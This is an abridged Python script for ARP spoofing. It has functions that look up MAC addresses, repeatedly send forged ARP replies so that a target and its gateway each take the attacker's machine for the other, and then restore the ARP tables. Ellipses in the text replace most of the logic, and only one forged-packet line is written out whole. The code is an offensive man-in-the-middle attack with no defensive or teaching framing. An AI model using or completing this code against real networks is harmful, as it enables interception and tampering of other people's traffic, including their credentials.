...
def get_mac_address(ip):
    """
    Get MAC address of a device by its IP address using ARP request
    """
...
def spoof_arp(target_ip, gateway_ip):
    """
    Perform ARP spoofing by sending fake ARP responses
    """
    # Get MAC addresses
    ...
    try:
        while True:
            ...
            # Create ARP response saying our MAC is the gateway's MAC
            packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                         psrc=gateway_ip)
            
            # Tell gateway that we are the target (spoof target)  
            # Create ARP response saying our MAC is the target's MAC
...
def restore_arp_table(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    Restore the original ARP table entries after attack
    """
